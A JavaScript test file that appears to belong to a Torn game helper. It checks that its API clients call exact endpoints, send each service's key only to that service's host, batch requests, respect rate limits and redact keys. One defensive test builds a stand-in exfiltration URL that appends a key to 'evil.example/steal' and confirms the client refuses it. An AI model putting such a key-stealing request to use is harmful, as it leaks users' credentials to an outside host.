/*
 * Every endpoint through a recording fetch: exact URLs, the Torn key only to
 * api.torn.com, the FFScouter key only to ffscouter.com, the TornStats key
 * only to www.tornstats.com, and nothing keyed to weav3r.dev.
 */
import test from 'node:test';
import assert from 'node:assert/strict';

import { TornApiClient } from '../src/api/client.js';
import * as torn from '../src/api/torn.js';
import { W3bClient, fetchW3bListings } from '../src/api/w3b.js';
import { makeFfsClient, fetchFfsStats, checkFfsKey, fetchFfsTargets, FFS_BATCH } from '../src/api/ffscouter.js';
import { makeTsClient, fetchSpyUser, fetchSpyFaction } from '../src/api/tornstats.js';
import { ThirdPartyClient, redactThirdKey } from '../src/api/third.js';

const TORN_KEY = 'TornKeyAAAA1111';
const FFS_KEY = 'FfsKeyBBBB22222x';
const TS_KEY = 'TsKeyCCCC333333';

function res(body, status = 200) {
    return { ok: status >= 200 && status < 300, status, json: async () => body };
}

function recorder(handler) {
    const calls = [];
    const f = async (url, init) => {
        calls.push({ url: String(url), init });
        return handler(String(url), calls.length, init);
    };
    f.calls = calls;
    return f;
}

const tornClient = (f) => new TornApiClient({ getKey: () => TORN_KEY, fetchImpl: f, maxRetries: 0, dedupTtlMs: 0 });
const noSleep = async () => {};

test('the Home call: one request for bars, cooldowns, refills, battle stats and gym', async () => {
    const f = recorder(() => res({ bars: {} }));
    await torn.fetchUserState(tornClient(f));
    const u = new URL(f.calls[0].url);
    assert.equal(u.origin + u.pathname, 'https://api.torn.com/v2/user');
    assert.equal(u.searchParams.get('selections'), 'bars,cooldowns,refills,battlestats,gym');
    assert.equal(u.searchParams.get('key'), TORN_KEY);
    assert.equal(u.searchParams.get('comment'), 'PumpingIron');
});

test('each wrapper asks for the exact v2 path', async () => {
    const f = recorder(() => res({ perks: {}, property: {}, equipment: [], gyms: [], items: [], itemdetails: [], members: [], info: {}, discord: {}, profile: {}, personalstats: [], attacks: [] }));
    const c = tornClient(f);
    await torn.fetchPerks(c);
    await torn.fetchProperty(c);
    await torn.fetchEquipment(c);
    await torn.fetchGyms(c);
    await torn.fetchItems(c, [206, '197', 206]);
    await torn.fetchItemDetails(c, ['111', 222]);
    await torn.fetchItemMarket(c, 206);
    await torn.fetchPointsMarket(c);
    await torn.fetchProfile(c, 77);
    await torn.fetchFactionMembers(c, 9);
    await torn.fetchFactionMembers(c);
    await torn.fetchKeyInfo(c);
    await torn.fetchDiscord(c);
    await torn.fetchAttackLog(c, 'abc123');
    await torn.fetchAttacks(c, { limit: 50 });
    await torn.fetchPersonalStats(c, { stat: ['xantaken', 'refills'] });
    await torn.fetchPersonalStats(c, { id: 77, cat: 'drugs' });
    const paths = f.calls.map((x) => {
        const u = new URL(x.url);
        u.searchParams.delete('key');
        u.searchParams.delete('comment');
        return u.pathname + (u.search || '');
    });
    assert.deepEqual(paths, [
        '/v2/user/perks',
        '/v2/user/property',
        '/v2/user/equipment',
        '/v2/torn/gyms',
        '/v2/torn/206,197/items',
        '/v2/torn/111,222/itemdetails',
        '/v2/market/206/itemmarket',
        '/v2/market/pointsmarket',
        '/v2/user/77/profile',
        '/v2/faction/9/members',
        '/v2/faction/members',
        '/v2/key/info',
        '/v2/user/discord',
        '/v2/torn/attacklog?log=abc123',
        '/v2/user/attacks?limit=50&sort=DESC',
        '/v2/user/personalstats?stat=xantaken%2Crefills',
        '/v2/user/77/personalstats?cat=drugs',
    ]);
    assert.ok(f.calls.every((x) => new URL(x.url).hostname === 'api.torn.com'));
});

test('inventory: one call per category; a category Torn refuses is skipped', async () => {
    const f = recorder((url) => {
        const cat = new URL(url).searchParams.get('cat');
        if (cat === 'Candy') return res({ error: { code: 21, error: 'Incorrect category' } });
        if (cat === 'Drug') return res({ inventory: { items: [{ id: 206, amount: 1 }, { id: 197, amount: 2 }, { id: 206, amount: 3, faction_owned: true }] } });
        return res({ inventory: { items: [] } });
    });
    const inv = await torn.fetchInventory(tornClient(f));
    assert.deepEqual(inv, { 206: 1, 197: 2 });
    assert.deepEqual(f.calls.map((x) => new URL(x.url).searchParams.get('cat')), ['Drug', 'Booster', 'Candy', 'Energy Drink']);
});

test('a dead key during inventory stops it (not skipped)', async () => {
    const f = recorder(() => res({ error: { code: 2, error: 'Incorrect key' } }));
    await assert.rejects(torn.fetchInventory(tornClient(f)), /Torn API 2/);
});

test('key info: Limited is enough, Minimal is not, a custom key needs the Home selections', () => {
    assert.equal(torn.keyIsEnough({ level: 3 }), true);
    assert.equal(torn.keyIsEnough({ level: 2 }), false);
    assert.equal(torn.keyIsEnough({ level: 0, selections: { user: ['bars', 'cooldowns', 'refills', 'battlestats', 'gym'] } }), true);
    assert.equal(torn.keyIsEnough({ level: 0, selections: { user: ['bars'] } }), false);
    assert.equal(torn.keyIsEnough({ level: null }), null);
});

test('personal stats come back as name → value', () => {
    assert.deepEqual(torn.personalStatValues([{ name: 'xantaken', value: 812 }, { name: 'refills', value: '40' }]), { xantaken: 812, refills: 40 });
    assert.deepEqual(torn.personalStatValues({ drugs: {} }), {});
});

test('TornW3B never receives a key: its URL carries only the comment', async () => {
    const f = recorder(() => res({ listings: [{ player_id: 1, price: 5, quantity: 1 }], total_listings: 1 }));
    const w = new W3bClient({ fetchImpl: f, sleep: noSleep });
    const r = await fetchW3bListings(w, 206);
    const u = new URL(f.calls[0].url);
    assert.equal(u.origin + u.pathname, 'https://weav3r.dev/api/marketplace/206');
    assert.deepEqual([...u.searchParams.keys()], ['comment']);
    assert.equal(u.searchParams.get('comment'), 'PumpingIron');
    for (const k of [TORN_KEY, FFS_KEY, TS_KEY]) assert.ok(!f.calls[0].url.includes(k));
    assert.equal(r.listings.length, 1);
});

test('FFScouter gets only the FFScouter key, batched at 205 ids', async () => {
    const f = recorder((url) => {
        const ids = new URL(url).searchParams.get('targets').split(',');
        return res(ids.slice(1).map((id) => ({ player_id: Number(id), bs_estimate: 1e9, last_updated: 1790000000, fair_fight: 2.1, bss_public: 60000, source: 'bss' })));
    });
    const c = makeFfsClient({ getKey: () => FFS_KEY, fetchImpl: f, sleep: noSleep });
    const ids = Array.from({ length: 210 }, (_, i) => i + 1);
    const out = await fetchFfsStats(c, ids);
    assert.equal(f.calls.length, 2);
    assert.equal(new URL(f.calls[0].url).searchParams.get('targets').split(',').length, FFS_BATCH);
    for (const call of f.calls) {
        const u = new URL(call.url);
        assert.equal(u.origin + u.pathname, 'https://ffscouter.com/api/v1/get-stats');
        assert.equal(u.searchParams.get('key'), FFS_KEY);
        assert.ok(!call.url.includes(TORN_KEY));
    }
    assert.equal(out.size, 210, 'every id asked for comes back');
    assert.equal(out.get(1).bsEstimate, null, 'the id FFScouter left out is an empty row');
    assert.equal(out.get(2).bsEstimate, 1e9);
    assert.equal(out.get(2).updatedAt, 1790000000 * 1000);
});

test('FFScouter 429 (code 21) pauses for retry_after_seconds, for every call', async () => {
    let t = 1_000_000;
    const f = recorder(() => res({ code: 21, error: 'Rate limit exceeded.', retry_after_seconds: 12 }, 429));
    const c = makeFfsClient({ getKey: () => FFS_KEY, fetchImpl: f, sleep: noSleep, now: () => t });
    await assert.rejects(fetchFfsStats(c, [1]), (e) => e.paused && e.retryAfterS === 12);
    await assert.rejects(fetchFfsStats(c, [2]), (e) => e.paused);
    assert.equal(f.calls.length, 1, 'nothing sent while paused');
    t += 13000;
    await assert.rejects(fetchFfsStats(c, [3]), (e) => e.paused);
    assert.equal(f.calls.length, 2, 'asks again after the wait');
});

test('FFScouter: an unregistered key (code 6) is dead and not asked again', async () => {
    const f = recorder(() => res({ code: 6, error: 'Invalid API key' }, 401));
    const c = makeFfsClient({ getKey: () => FFS_KEY, fetchImpl: f, sleep: noSleep });
    await assert.rejects(fetchFfsStats(c, [1]), (e) => e.deadKey && /not registered/.test(e.message));
    await assert.rejects(fetchFfsStats(c, [1]), /rejected this key/);
    assert.equal(f.calls.length, 1);
});

test('FFScouter check-key and targets (404 code 17 = no targets)', async () => {
    const f = recorder((url) => {
        if (url.includes('check-key')) return res({ is_registered: true, is_premium: false, policy_update_required: false });
        if (url.includes('minlevel=40')) return res({ code: 17, error: 'No targets' }, 404);
        return res({ parameters: {}, targets: [{ player_id: 5, name: 'Pallas', level: 55, fair_fight: 1.8, bs_estimate: 1.5e8, last_action: 1790000000 }] });
    });
    const c = makeFfsClient({ getKey: () => FFS_KEY, fetchImpl: f, sleep: noSleep });
    assert.deepEqual(await checkFfsKey(c), { registered: true, premium: false, policyUpdate: false });
    assert.deepEqual(await fetchFfsTargets(c, { minLevel: 40, maxLevel: 90 }), []);
    const t = await fetchFfsTargets(c, { preset: 'respect' });
    assert.equal(t[0].name, 'Pallas');
    assert.equal(new URL(f.calls[2].url).searchParams.get('preset'), 'respect');
    assert.equal(new URL(f.calls[1].url).searchParams.get('inactiveonly'), '1');
});

test('TornStats: the key goes in the path to www.tornstats.com only', async () => {
    const f = recorder((url) => (url.includes('/spy/user/') ? res({ status: true, spy: { status: true, strength: 100, speed: 200, defense: 300, dexterity: 400, total: 1000, timestamp: 1790000000 } }) : res({ status: true, faction: { members: { 5: { spy: { strength: 1, speed: 2, defense: 3, dexterity: 4, total: 10, timestamp: 1 } }, 6: { name: 'x' } } } })));
    const c = makeTsClient({ getKey: () => TS_KEY, fetchImpl: f, sleep: noSleep });
    const s = await fetchSpyUser(c, 77);
    assert.equal(f.calls[0].url, 'https://www.tornstats.com/api/v2/' + TS_KEY + '/spy/user/77');
    assert.deepEqual(s, { str: 100, spd: 200, def: 300, dex: 400, total: 1000, at: 1790000000000 });
    const fac = await fetchSpyFaction(c, 9);
    assert.deepEqual(Object.keys(fac), ['5']);
    assert.ok(!f.calls.some((x) => x.url.includes(TORN_KEY) || x.url.includes(FFS_KEY)));
});

test('TornStats: "User not found" marks the key dead; the message never has the key', async () => {
    const f = recorder(() => res({ status: false, message: 'ERROR: User not found. ' + TS_KEY }, 404));
    const c = makeTsClient({ getKey: () => TS_KEY, fetchImpl: f, sleep: noSleep });
    await assert.rejects(fetchSpyUser(c, 1), (e) => e.deadKey && !e.message.includes(TS_KEY));
});

test('a third-party client refuses any other host, even through an absolute URL', async () => {
    const f = recorder(() => res({}));
    const c = new ThirdPartyClient({ service: 'X', host: 'ffscouter.com', getKey: () => FFS_KEY, fetchImpl: f, sleep: noSleep });
    await assert.rejects(c.request((key) => 'https://evil.example/steal?key=' + key), /Refusing/);
    await assert.rejects(c.request((key) => 'http://ffscouter.com/api?key=' + key), /Refusing/, 'https only');
    assert.equal(f.calls.length, 0);
    assert.equal(redactThirdKey('bad key=' + FFS_KEY + ' and ' + FFS_KEY, FFS_KEY), 'bad key=<redacted> and <redacted>');
});

test('a third-party client with no key sends nothing', async () => {
    const f = recorder(() => res({}));
    const c = makeFfsClient({ getKey: () => '', fetchImpl: f, sleep: noSleep });
    await assert.rejects(fetchFfsStats(c, [1]), /No FFScouter key/);
    assert.equal(f.calls.length, 0);
});

test('third-party budgets are shared through storage and respected', async () => {
    let shared = {};
    let t = 5_000_000;
    const slept = [];
    const f = recorder(() => res([]));
    const mk = () => makeFfsClient({ getKey: () => FFS_KEY, fetchImpl: f, now: () => t, sleep: async (ms) => { slept.push(ms); t += ms; }, loadShared: () => shared, saveShared: (s) => { shared = s; }, maxPerMinute: 2 });
    const a = mk();
    const b = mk();
    await fetchFfsStats(a, [1]);
    await fetchFfsStats(b, [2]);
    await fetchFfsStats(a, [3]);
    assert.equal(f.calls.length, 3);
    assert.ok(slept.length >= 1 && slept[0] > 50000, 'the third waited for the shared window');
});
